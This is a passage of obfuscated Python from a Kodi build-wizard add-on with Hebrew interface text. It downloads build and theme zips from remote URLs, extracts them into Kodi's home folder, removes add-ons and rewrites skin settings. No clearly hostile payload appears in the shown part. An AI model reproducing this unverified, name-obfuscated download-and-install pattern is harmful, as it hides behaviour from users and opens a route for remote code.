			O0O0OO000O0O0O0O0 =re .compile (OO0O0O0OOO000O0O0 ).findall (O0O0O0O0000OO0OO0 )[0 ]#line:3871
			OOO0000OOO0OOO0O0 =open (O00O00O00OOO00OO0 ,'w')#line:3872
			OOO0000OOO0OOO0O0 .write (O0O0O0O0000OO0OO0 .replace ('<import addon="xbmc.gui" version="5.12.0%s/>'%O0O0OO000O0O0O0O0 ,'<import addon="xbmc.gui" version="5.14.0"/>'))#line:3873
			OOO0000OOO0OOO0O0 .close ()#line:3874
		except :#line:3875
				pass #line:3876
		wiz .kodi17Fix ()#line:3877
		O00O00O00OOO00OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3878
		try :#line:3879
			OOO0000OOO0OOO0O0 =open (O00O00O00OOO00OO0 ,'r')#line:3880
			O0O0O0O0000OO0OO0 =OOO0000OOO0OOO0O0 .read ()#line:3881
			OOO0000OOO0OOO0O0 .close ()#line:3882
			OO0O0O0OOO000O0O0 ='<setting id="locale.keyboardlayouts" default="true(.+?)/setting>'#line:3883
			O0O0OO000O0O0O0O0 =re .compile (OO0O0O0OOO000O0O0 ).findall (O0O0O0O0000OO0OO0 )[0 ]#line:3884
			OOO0000OOO0OOO0O0 =open (O00O00O00OOO00OO0 ,'w')#line:3885
			OOO0000OOO0OOO0O0 .write (O0O0O0O0000OO0OO0 .replace ('<setting id="locale.keyboardlayouts" default="true%s/setting>'%O0O0OO000O0O0O0O0 ,'<setting id="locale.keyboardlayouts">English QWERTY|Hebrew QWERTY</setting>'))#line:3886
			OOO0000OOO0OOO0O0 .close ()#line:3887
		except :#line:3888
				pass #line:3889
		swapSkins ('skin.Premium.mod')#line:3890
def buildWizard (O00000000OOOO0000 ,OOO00O0O000OOO0O0 ,theme =None ,over =False ):#line:3893
	if over ==False :#line:3894
		OOOOOO0O0OOOO0000 =wiz .checkBuild (O00000000OOOO0000 ,'url')#line:3895
		if OOOOOO0O0OOOO0000 ==False :#line:3897
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]אנא המתן...[/COLOR]'%COLOR2 )#line:3902
			xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.Anonymous/?mode=install&name=+Kodi+Premium&url=gui)")#line:3903
			return #line:3904
		O0OOOO0OOOO00O000 =wiz .workingURL (OOOOOO0O0OOOO0000 )#line:3905
		if O0OOOO0OOOO00O000 ==False :#line:3906
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Build Zip Error: %s[/COLOR]"%(COLOR2 ,O0OOOO0OOOO00O000 ))#line:3907
			return #line:3908
	if OOO00O0O000OOO0O0 =='gui':#line:3909
		if O00000000OOOO0000 ==BUILDNAME :#line:3910
			if over ==True :O00000O000OO0O000 =1 #line:3911
			else :O00000O000OO0O000 =1 #line:3912
		else :#line:3913
			O00000O000OO0O000 =1 #line:3914
		if O00000O000OO0O000 :#line:3915
			remove_addons ()#line:3916
			remove_addons2 ()#line:3917
			OO0OOO0OO0O0O0O0O =wiz .checkBuild (O00000000OOOO0000 ,'gui')#line:3918
			OO000OOO0000O00O0 =O00000000OOOO0000 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3919
			if not wiz .workingURL (OO0OOO0OO0O0O0O0O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3920
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3921
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00000000OOOO0000 ),'','אנא המתן')#line:3922
			OO0O0O0O00OO000OO =os .path .join (PACKAGES ,'%s_guisettings.zip'%OO000OOO0000O00O0 )#line:3923
			try :os .remove (OO0O0O0O00OO000OO )#line:3924
			except :pass #line:3925
			logging .warning (OO0OOO0OO0O0O0O0O )#line:3926
			if 'google'in OO0OOO0OO0O0O0O0O :#line:3927
			   O000O0O0OO0O0000O =googledrive_download (OO0OOO0OO0O0O0O0O ,OO0O0O0O00OO000OO ,DP ,wiz .checkBuild (O00000000OOOO0000 ,'filesize'))#line:3928
			else :#line:3931
			  downloader .download (OO0OOO0OO0O0O0O0O ,OO0O0O0O00OO000OO ,DP )#line:3932
			xbmc .sleep (100 )#line:3933
			O0OOO0000O0OO0OO0 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00000000OOOO0000 )#line:3934
			DP .update (0 ,O0OOO0000O0OO0OO0 ,'','אנא המתן')#line:3935
			extract .all (OO0O0O0O00OO000OO ,HOME ,DP ,title =O0OOO0000O0OO0OO0 )#line:3936
			DP .close ()#line:3937
			wiz .defaultSkin ()#line:3938
			wiz .lookandFeelData ('save')#line:3939
			wiz .kodi17Fix ()#line:3940
			if KODIV >=18 :#line:3941
				skindialogsettind18 ()#line:3942
			xbmc .executebuiltin ("ReloadSkin()")#line:3943
			if INSTALLMETHOD ==1 :OOOO0OO0000000OO0 =1 #line:3944
			elif INSTALLMETHOD ==2 :OOOO0OO0000000OO0 =0 #line:3945
			else :DP .close ()#line:3946
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:3947
			update_Votes ()#line:3948
			indicatorfastupdate ()#line:3949
		else :#line:3951
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3952
	if OOO00O0O000OOO0O0 =='gui2':#line:3953
		if O00000000OOOO0000 ==BUILDNAME :#line:3954
			if over ==True :O00000O000OO0O000 =1 #line:3955
			else :O00000O000OO0O000 =1 #line:3956
		else :#line:3957
			O00000O000OO0O000 =1 #line:3958
		if O00000O000OO0O000 :#line:3959
			remove_addons ()#line:3960
			remove_addons2 ()#line:3961
			OO0OOO0OO0O0O0O0O =wiz .checkBuild (O00000000OOOO0000 ,'gui')#line:3962
			OO000OOO0000O00O0 =O00000000OOOO0000 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3963
			if not wiz .workingURL (OO0OOO0OO0O0O0O0O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3964
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3965
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00000000OOOO0000 ),'','אנא המתן')#line:3966
			OO0O0O0O00OO000OO =os .path .join (PACKAGES ,'%s_guisettings.zip'%OO000OOO0000O00O0 )#line:3967
			try :os .remove (OO0O0O0O00OO000OO )#line:3968
			except :pass #line:3969
			logging .warning (OO0OOO0OO0O0O0O0O )#line:3970
			if 'google'in OO0OOO0OO0O0O0O0O :#line:3971
			   O000O0O0OO0O0000O =googledrive_download (OO0OOO0OO0O0O0O0O ,OO0O0O0O00OO000OO ,DP ,wiz .checkBuild (O00000000OOOO0000 ,'filesize'))#line:3972
			else :#line:3975
			  downloader .download (OO0OOO0OO0O0O0O0O ,OO0O0O0O00OO000OO ,DP )#line:3976
			xbmc .sleep (100 )#line:3977
			O0OOO0000O0OO0OO0 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00000000OOOO0000 )#line:3978
			DP .update (0 ,O0OOO0000O0OO0OO0 ,'','אנא המתן')#line:3979
			extract .all (OO0O0O0O00OO000OO ,HOME ,DP ,title =O0OOO0000O0OO0OO0 )#line:3980
			DP .close ()#line:3981
			wiz .defaultSkin ()#line:3982
			wiz .lookandFeelData ('save')#line:3983
			if INSTALLMETHOD ==1 :OOOO0OO0000000OO0 =1 #line:3986
			elif INSTALLMETHOD ==2 :OOOO0OO0000000OO0 =0 #line:3987
			else :DP .close ()#line:3988
		else :#line:3990
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3991
	elif OOO00O0O000OOO0O0 =='fresh':#line:3992
		freshStart (O00000000OOOO0000 )#line:3993
	elif OOO00O0O000OOO0O0 =='normal':#line:3994
		if url =='normal':#line:3995
			if KEEPTRAKT =='true':#line:3996
				traktit .autoUpdate ('all')#line:3997
				wiz .setS ('traktlastsave',str (THREEDAYS ))#line:3998
			if KEEPREAL =='true':#line:3999
				debridit .autoUpdate ('all')#line:4000
				wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4001
			if KEEPLOGIN =='true':#line:4002
				loginit .autoUpdate ('all')#line:4003
				wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4004
		OOOO000OOOOOOOOO0 =int (KODIV );OO0O0OOO0OOOO0OO0 =int (float (wiz .checkBuild (O00000000OOOO0000 ,'kodi')))#line:4005
		if not OOOO000OOOOOOOOO0 ==OO0O0OOO0OOOO0OO0 :#line:4006
			if OOOO000OOOOOOOOO0 ==16 and OO0O0OOO0OOOO0OO0 <=15 :O0000O0O00OO0OO0O =False #line:4007
			else :O0000O0O00OO0OO0O =True #line:4008
		else :O0000O0O00OO0OO0O =False #line:4009
		if O0000O0O00OO0OO0O ==True :#line:4010
			O0O0O00OO0O000OO0 =1 #line:4011
		else :#line:4012
			if not over ==False :O0O0O00OO0O000OO0 =1 #line:4013
			else :O0O0O00OO0O000OO0 =DIALOG .yesno (ADDONTITLE ,'התקנה רגילה:','מצב זה שומר הרחבות קיימות, האם להמשיך?',nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4014
		if O0O0O00OO0O000OO0 :#line:4015
			wiz .clearS ('build')#line:4016
			OO0OOO0OO0O0O0O0O =wiz .checkBuild (O00000000OOOO0000 ,'url')#line:4017
			OO000OOO0000O00O0 =O00000000OOOO0000 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4018
			if not wiz .workingURL (OO0OOO0OO0O0O0O0O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Build Install: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4019
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4020
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00000000OOOO0000 ,wiz .checkBuild (O00000000OOOO0000 ,'version')),'','אנא המתן')#line:4021
			OO0O0O0O00OO000OO =os .path .join (PACKAGES ,'%s.zip'%OO000OOO0000O00O0 )#line:4022
			try :os .remove (OO0O0O0O00OO000OO )#line:4023
			except :pass #line:4024
			logging .warning (OO0OOO0OO0O0O0O0O )#line:4025
			if 'google'in OO0OOO0OO0O0O0O0O :#line:4026
			   O000O0O0OO0O0000O =googledrive_download (OO0OOO0OO0O0O0O0O ,OO0O0O0O00OO000OO ,DP ,wiz .checkBuild (O00000000OOOO0000 ,'filesize'))#line:4027
			else :#line:4030
			  downloader .download (OO0OOO0OO0O0O0O0O ,OO0O0O0O00OO000OO ,DP )#line:4031
			xbmc .sleep (1000 )#line:4032
			O0OOO0000O0OO0OO0 ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00000000OOOO0000 ,wiz .checkBuild (O00000000OOOO0000 ,'version'))#line:4033
			DP .update (0 ,O0OOO0000O0OO0OO0 ,'','Please Wait')#line:4034
			O0OO0OOOO0OOO0O0O ,O000O00000O0O0000 ,OOOO0OO000OO00O0O =extract .all (OO0O0O0O00OO000OO ,HOME ,DP ,title =O0OOO0000O0OO0OO0 )#line:4035
			if int (float (O0OO0OOOO0OOO0O0O ))>0 :#line:4036
				try :#line:4037
					wiz .fixmetas ()#line:4038
				except :pass #line:4039
				wiz .lookandFeelData ('save')#line:4040
				wiz .defaultSkin ()#line:4041
				wiz .setS ('buildname',O00000000OOOO0000 )#line:4043
				wiz .setS ('buildversion',wiz .checkBuild (O00000000OOOO0000 ,'version'))#line:4044
				wiz .setS ('buildtheme','')#line:4045
				wiz .setS ('latestversion',wiz .checkBuild (O00000000OOOO0000 ,'version'))#line:4046
				wiz .setS ('lastbuildcheck',str (NEXTCHECK ))#line:4047
				wiz .setS ('installed','true')#line:4048
				wiz .setS ('extract',str (O0OO0OOOO0OOO0O0O ))#line:4049
				wiz .setS ('errors',str (O000O00000O0O0000 ))#line:4050
				wiz .log ('INSTALLED %s: [ERRORS:%s]'%(O0OO0OOOO0OOO0O0O ,O000O00000O0O0000 ))#line:4051
				fastupdatefirstbuild (NOTEID )#line:4052
				wiz .kodi17Fix ()#line:4053
				skin_homeselect ()#line:4054
				skin_lower ()#line:4055
				rdbuildinstall ()#line:4056
				try :gaiaserenaddon ()#line:4057
				except :pass #line:4058
				adults18 ()#line:4059
				skinfix18 ()#line:4060
				try :os .remove (OO0O0O0O00OO000OO )#line:4062
				except :pass #line:4063
				OOO00O00OOOOOO00O =(ADDON .getSetting ("auto_rd"))#line:4064
				if OOO00O00OOOOOO00O =='true':#line:4065
					try :#line:4066
						setautorealdebrid ()#line:4067
					except :pass #line:4068
				try :#line:4069
					autotrakt ()#line:4070
				except :pass #line:4071
				O0OOOOO000O00000O =(ADDON .getSetting ("imdb_on"))#line:4072
				if O0OOOOO000O00000O =='true':#line:4073
					imdb_synck ()#line:4074
				iptvset ()#line:4075
				if int (float (O000O00000O0O0000 ))>0 :#line:4077
					O00000O000OO0O000 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00000000OOOO0000 ,wiz .checkBuild (O00000000OOOO0000 ,'version')),'הושלם: [COLOR %s]%s%s[/COLOR] [שגיאות:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,O0OO0OOOO0OOO0O0O ,'%',COLOR1 ,O000O00000O0O0000 ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:4078
					if O00000O000OO0O000 :#line:4079
						if isinstance (O000O00000O0O0000 ,unicode ):#line:4080
							OOOO0OO000OO00O0O =OOOO0OO000OO00O0O .encode ('utf-8')#line:4081
						wiz .TextBox (ADDONTITLE ,OOOO0OO000OO00O0O )#line:4082
				DP .close ()#line:4083
				O0O0O00O000OO0O0O =wiz .themeCount (O00000000OOOO0000 )#line:4084
				builde_Votes ()#line:4085
				indicator ()#line:4086
				if not O0O0O00O000OO0O0O ==False :#line:4087
					buildWizard (O00000000OOOO0000 ,'theme')#line:4088
				if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4089
				if INSTALLMETHOD ==1 :OOOO0OO0000000OO0 =1 #line:4090
				elif INSTALLMETHOD ==2 :OOOO0OO0000000OO0 =0 #line:4091
				else :resetkodi ()#line:4092
				if OOOO0OO0000000OO0 ==1 :wiz .reloadFix ()#line:4094
				else :wiz .killxbmc (True )#line:4095
			else :#line:4096
				if isinstance (O000O00000O0O0000 ,unicode ):#line:4097
					OOOO0OO000OO00O0O =OOOO0OO000OO00O0O .encode ('utf-8')#line:4098
				OOO00O0OOOOOO0OOO =open (OO0O0O0O00OO000OO ,'r')#line:4099
				OO0O000O000OOO0OO =OOO00O0OOOOOO0OOO .read ()#line:4100
				O00O000O0OOOOOO0O =''#line:4101
				for OOO000O0O000O0OO0 in O000O0O0OO0O0000O :#line:4102
				  O00O000O0OOOOOO0O ='key: '+O00O000O0OOOOOO0O +'\n'+OOO000O0O000O0OO0 #line:4103
				wiz .TextBox ("%s: בעיה בהתקנת הבילד"%ADDONTITLE ,OOOO0OO000OO00O0O +'לפתרון הבעיה יש לשנות את התאריך במכשיר ליום אחד קודם.'+O00O000O0OOOOOO0O )#line:4104
		else :#line:4105
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנת הבילד: מבוטלת![/COLOR]'%COLOR2 )#line:4106
	elif OOO00O0O000OOO0O0 =='theme':#line:4107
		if theme ==None :#line:4108
			O0O0O00O000OO0O0O =wiz .checkBuild (O00000000OOOO0000 ,'theme')#line:4109
			OOO00000OOOO00000 =[]#line:4110
			if not O0O0O00O000OO0O0O =='http://'and wiz .workingURL (O0O0O00O000OO0O0O )==True :#line:4111
				OOO00000OOOO00000 =wiz .themeCount (O00000000OOOO0000 ,False )#line:4112
				if len (OOO00000OOOO00000 )>0 :#line:4113
					if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]The Build [COLOR %s]%s[/COLOR] comes with [COLOR %s]%s[/COLOR] different themes"%(COLOR2 ,COLOR1 ,O00000000OOOO0000 ,COLOR1 ,len (OOO00000OOOO00000 )),"Would you like to install one now?[/COLOR]",yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]"):#line:4114
						wiz .log ("Theme List: %s "%str (OOO00000OOOO00000 ))#line:4115
						O00O0OO000O000000 =DIALOG .select (ADDONTITLE ,OOO00000OOOO00000 )#line:4116
						wiz .log ("Theme install selected: %s"%O00O0OO000O000000 )#line:4117
						if not O00O0OO000O000000 ==-1 :theme =OOO00000OOOO00000 [O00O0OO000O000000 ];OOOO00O00O0O00OOO =True #line:4118
						else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4119
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4120
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: None Found![/COLOR]'%COLOR2 )#line:4121
		else :OOOO00O00O0O00OOO =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to install the theme:'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,theme ),'for [COLOR %s]%s v%s[/COLOR]?[/COLOR]'%(COLOR1 ,O00000000OOOO0000 ,wiz .checkBuild (O00000000OOOO0000 ,'version')),yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]")#line:4122
		if OOOO00O00O0O00OOO :#line:4123
			OOO00O000000O0OO0 =wiz .checkTheme (O00000000OOOO0000 ,theme ,'url')#line:4124
			OO000OOO0000O00O0 =O00000000OOOO0000 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4125
			if not wiz .workingURL (OOO00O000000O0OO0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Invalid Zip Url![/COLOR]'%COLOR2 );return False #line:4126
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4127
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme ),'','Please Wait')#line:4128
			OO0O0O0O00OO000OO =os .path .join (PACKAGES ,'%s.zip'%OO000OOO0000O00O0 )#line:4129
			try :os .remove (OO0O0O0O00OO000OO )#line:4130
			except :pass #line:4131
			downloader .download (OOO00O000000O0OO0 ,OO0O0O0O00OO000OO ,DP )#line:4132
			xbmc .sleep (1000 )#line:4133
			DP .update (0 ,"","Installing %s "%O00000000OOOO0000 )#line:4134
			O0O00OO0OO0OO0O00 =False #line:4135
			if url not in ["fresh","normal"]:#line:4136
				O0O00OO0OO0OO0O00 =testTheme (OO0O0O0O00OO000OO )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4137
				OOO0OO0000O00OO0O =testGui (OO0O0O0O00OO000OO )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4138
				if O0O00OO0OO0OO0O00 ==True :#line:4139
					wiz .lookandFeelData ('save')#line:4140
					O0O00OOOO00000O00 ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4141
					O00O00O0OO0OO000O =xbmc .getSkinDir ()#line:4142
					skinSwitch .swapSkins (O0O00OOOO00000O00 )#line:4144
					OOOOO000O00OO0OOO =0 #line:4145
					xbmc .sleep (1000 )#line:4146
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OOOOO000O00OO0OOO <150 :#line:4147
						OOOOO000O00OO0OOO +=1 #line:4148
						xbmc .sleep (1000 )#line:4149
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4150
						wiz .ebi ('SendClick(11)')#line:4151
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4152
					xbmc .sleep (1000 )#line:4153
			O0OOO0000O0OO0OO0 ='[COLOR %s][B]Installing Theme:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme )#line:4154
			DP .update (0 ,O0OOO0000O0OO0OO0 ,'','אנא המתן')#line:4155
			O0OO0OOOO0OOO0O0O ,O000O00000O0O0000 ,OOOO0OO000OO00O0O =extract .all (OO0O0O0O00OO000OO ,HOME ,DP ,title =O0OOO0000O0OO0OO0 )#line:4156
			wiz .setS ('buildtheme',theme )#line:4157
			wiz .log ('INSTALLED %s: [שגיאות:%s]'%(O0OO0OOOO0OOO0O0O ,O000O00000O0O0000 ))#line:4158
			DP .close ()#line:4159
			if url not in ["fresh","normal"]:#line:4160
				wiz .forceUpdate ()#line:4161
				if KODIV >=17 :wiz .kodi17Fix ()#line:4162
				if OOO0OO0000O00OO0O ==True :#line:4163
					wiz .lookandFeelData ('save')#line:4164
					wiz .defaultSkin ()#line:4165
					O00O00O0OO0OO000O =wiz .getS ('defaultskin')#line:4166
					skinSwitch .swapSkins (O00O00O0OO0OO000O )#line:4167
					OOOOO000O00OO0OOO =0 #line:4168
					xbmc .sleep (1000 )#line:4169
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OOOOO000O00OO0OOO <150 :#line:4170
						OOOOO000O00OO0OOO +=1 #line:4171
						xbmc .sleep (1000 )#line:4172
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4174
						wiz .ebi ('SendClick(11)')#line:4175
					wiz .lookandFeelData ('restore')#line:4176
				elif O0O00OO0OO0OO0O00 ==True :#line:4177
					skinSwitch .swapSkins (O00O00O0OO0OO000O )#line:4178
					OOOOO000O00OO0OOO =0 #line:4179
					xbmc .sleep (1000 )#line:4180
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OOOOO000O00OO0OOO <150 :#line:4181
						OOOOO000O00OO0OOO +=1 #line:4182
						xbmc .sleep (1000 )#line:4183
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4185
						wiz .ebi ('SendClick(11)')#line:4186
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4187
					wiz .lookandFeelData ('restore')#line:4188
				else :#line:4189
					wiz .ebi ("ReloadSkin()")#line:4190
					xbmc .sleep (1000 )#line:4191
					wiz .ebi ("Container.Refresh")#line:4192
		else :#line:4193
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 )#line:4194
def skin_homeselect ():#line:4198
	try :#line:4200
		OO0O0O0OOOOO0O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4201
		O0000O000OO0O0OOO =open (OO0O0O0OOOOO0O000 ,'r')#line:4203
		OO0OO0O0OO0O000OO =O0000O000OO0O0OOO .read ()#line:4204
		O0000O000OO0O0OOO .close ()#line:4205
		O000OOOOO00OOO00O ='<setting id="HomeS" type="string(.+?)/setting>'#line:4206
		OOOO00O00OOO0OOO0 =re .compile (O000OOOOO00OOO00O ).findall (OO0OO0O0OO0O000OO )[0 ]#line:4207
		O0000O000OO0O0OOO =open (OO0O0O0OOOOO0O000 ,'w')#line:4208
		O0000O000OO0O0OOO .write (OO0OO0O0OO0O000OO .replace ('<setting id="HomeS" type="string%s/setting>'%OOOO00O00OOO0OOO0 ,'<setting id="HomeS" type="string"></setting>'))#line:4209
		O0000O000OO0O0OOO .close ()#line:4210
	except :#line:4211
		pass #line:4212
def skin_lower ():#line:4215
	O00O0O000OO0OO0OO =(ADDON .getSetting ("lower"))#line:4216
	if O00O0O000OO0OO0OO =='true':#line:4217
		try :#line:4220
			O0O0O000O0OO00OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4221
			O000O0OOO0O00OOOO =open (O0O0O000O0OO00OOO ,'r')#line:4223
			OO000000O000O00O0 =O000O0OOO0O00OOOO .read ()#line:4224
			O000O0OOO0O00OOOO .close ()#line:4225
			OO0OOO0OO0O0OOO00 ='<setting id="none_widget" type="bool(.+?)/setting>'#line:4226
			O00OO0O0OOOO0OO0O =re .compile (OO0OOO0OO0O0OOO00 ).findall (OO000000O000O00O0 )[0 ]#line:4227
			O000O0OOO0O00OOOO =open (O0O0O000O0OO00OOO ,'w')#line:4228
			O000O0OOO0O00OOOO .write (OO000000O000O00O0 .replace ('<setting id="none_widget" type="bool%s/setting>'%O00OO0O0OOOO0OO0O ,'<setting id="none_widget" type="bool">true</setting>'))#line:4229
			O000O0OOO0O00OOOO .close ()#line:4230
			O0O0O000O0OO00OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4232
			O000O0OOO0O00OOOO =open (O0O0O000O0OO00OOO ,'r')#line:4234
			OO000000O000O00O0 =O000O0OOO0O00OOOO .read ()#line:4235
			O000O0OOO0O00OOOO .close ()#line:4236
			OO0OOO0OO0O0OOO00 ='<setting id="DisableOverlayColor" type="bool(.+?)/setting>'#line:4237
			O00OO0O0OOOO0OO0O =re .compile (OO0OOO0OO0O0OOO00 ).findall (OO000000O000O00O0 )[0 ]#line:4238
			O000O0OOO0O00OOOO =open (O0O0O000O0OO00OOO ,'w')#line:4239
			O000O0OOO0O00OOOO .write (OO000000O000O00O0 .replace ('<setting id="DisableOverlayColor" type="bool%s/setting>'%O00OO0O0OOOO0OO0O ,'<setting id="DisableOverlayColor" type="bool">true</setting>'))#line:4240
			O000O0OOO0O00OOOO .close ()#line:4241
			O0O0O000O0OO00OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4243
			O000O0OOO0O00OOOO =open (O0O0O000O0OO00OOO ,'r')#line:4245
			OO000000O000O00O0 =O000O0OOO0O00OOOO .read ()#line:4246
			O000O0OOO0O00OOOO .close ()#line:4247
			OO0OOO0OO0O0OOO00 ='<setting id="backgroundwallpaper" type="bool(.+?)/setting>'#line:4248
			O00OO0O0OOOO0OO0O =re .compile (OO0OOO0OO0O0OOO00 ).findall (OO000000O000O00O0 )[0 ]#line:4249
			O000O0OOO0O00OOOO =open (O0O0O000O0OO00OOO ,'w')#line:4250
			O000O0OOO0O00OOOO .write (OO000000O000O00O0 .replace ('<setting id="backgroundwallpaper" type="bool%s/setting>'%O00OO0O0OOOO0OO0O ,'<setting id="backgroundwallpaper" type="bool">true</setting>'))#line:4251
			O000O0OOO0O00OOOO .close ()#line:4252
			O0O0O000O0OO00OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4256
			O000O0OOO0O00OOOO =open (O0O0O000O0OO00OOO ,'r')#line:4258
			OO000000O000O00O0 =O000O0OOO0O00OOOO .read ()#line:4259
			O000O0OOO0O00OOOO .close ()#line:4260
			OO0OOO0OO0O0OOO00 ='<setting id="show.clearlogo" type="bool(.+?)/setting>'#line:4261
			O00OO0O0OOOO0OO0O =re .compile (OO0OOO0OO0O0OOO00 ).findall (OO000000O000O00O0 )[0 ]#line:4262
			O000O0OOO0O00OOOO =open (O0O0O000O0OO00OOO ,'w')#line:4263
